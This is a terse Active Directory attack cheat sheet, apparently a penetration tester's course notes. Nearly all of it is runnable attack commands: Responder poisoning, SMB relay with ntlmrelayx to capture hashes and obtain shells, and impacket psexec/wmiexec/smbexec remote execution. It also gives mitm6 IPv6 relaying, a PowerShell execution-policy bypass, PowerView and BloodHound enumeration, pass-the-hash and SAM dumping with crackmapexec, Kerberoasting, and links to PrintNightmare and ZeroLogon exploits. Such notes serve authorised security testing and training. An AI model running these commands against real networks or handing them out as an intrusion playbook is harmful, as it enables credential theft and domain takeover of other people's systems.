Attacking AD
LLMNR NBT-NS
Run responder at the beginning of the day

# responder -I eth1 -dwv 

SMB Relay
Sweep the network in the morning for smb

# nmap --script=smb2-security-mode.nse -p445 10.0.0.0/24 -v
# nmap --script=smb2-security-mode.nse -p445 10.200.200.0/24 -v

For SMB Relay, look for “Message signing enabled but not required” from nmap scan

Create a targets.txt from the IPs with  “Message signing enabled but not required” 

Run this to get the hashes
# ntlmrelayx.py -tf targets.txt -smb2support

Run this to create a shell
# ntlmrelayx.py -tf targets.txt -smb2support -i

Listen for the shell
# nc 127.0.0.1 <port number>

Alternative to gaining shell
Use metasploit: look for
psexec
psexec_psh 

Or use impacket scripts
smbexec.py
# smbexec.py <domain>/<user>:<password>@<ip>
wmiexec.py
# wmiexec.py <domain>/<user>:<password>@<ip>
psexec.py
# psexec.py <domain>/<user>:<password>@<ip>

IPv6 Attacks
Start mitm6
# mitm6 -d <domain> -i eth1
# ntlmrelayx.py -6 -t ldaps://<server ip> -wh fakewpad.<domain> -l lootme 


Post-Compromise Enumeration
Powerview
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

Bypass execution prevention 
> powershell -ep bypass
> . .\PowerView.ps1

Useful Commands
https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
> Get-NetDomain
> Get-NetDomainController
> Get-DomainPolicy
> (Get-DomainPolicy)."SystemAccess"
> Get-NetUser | select cn
> Get-NetUser | select samaccountname
> Get-NetUser | select description
> Get-NetComputer
> Invoke-ShareFinder
> Get-NetGPO | select displayname, whenchanged

Bloodhound
# apt install bloodhound
# sudo neo4j console
http://localhost:7474/browser/
neo4j:neo4j
Search for sharphound

> Invoke-BloodHound -CollectionMethod All -Domain Marvel.local -ZipFileName file.zip

Pass the Hash / Pass the Password
need credential first
username and password or
shell on machine
 
Pass the Password / Pass the Hash
crackmapexec smb <ip/CIDR> -u <user> -H <last part of NTLM hash> --local-auth
crackmapexec smb <ip/CIDR> -u  <user> -d <domain> -p <password>
crackmapexec smb <ip/CIDR> -u  <user> -d <domain> -p <password> --sam
psexec.py <user>:@<ip> -hashes <NTLM hash>

Kerberoasting
# GetUserSPNs.py <domain>/<user>:<password> -dc-ip <server ip> -request

GPP Attack
 
Links
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#scf-and-url-file-attack-against-writeable-share
https://github.com/cube0x0/CVE-2021-1675

URL File Attacks
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#scf-and-url-file-attack-against-writeable-share![image](https://user-images.githubusercontent.com/77715808/202856425-18e76cdd-e59f-41a9-a436-764b6ce0b6e2.png)

PrintNightmare (CVE-2021-1675)![image](https://user-images.githubusercontent.com/77715808/202856407-098521b8-3c5b-4cc0-945f-d923b7711098.png)
cube0x0 RCE - https://github.com/cube0x0/CVE-2021-1675
calebstewart LPE - https://github.com/calebstewart/CVE-2021-1675

What is ZeroLogon? - https://www.trendmicro.com/en_us/what-is/zerologon.ht
dirkjanm CVE-2020-1472 - https://github.com/dirkjanm/CVE-2020-1472
SecuraBV ZeroLogon Checker - https://github.com/SecuraBV/CVE-2020-1472![image](https://user-images.githubusercontent.com/77715808/202856362-66ba1dfb-0eb0-467a-826c-4f6cbdb1317d.png)
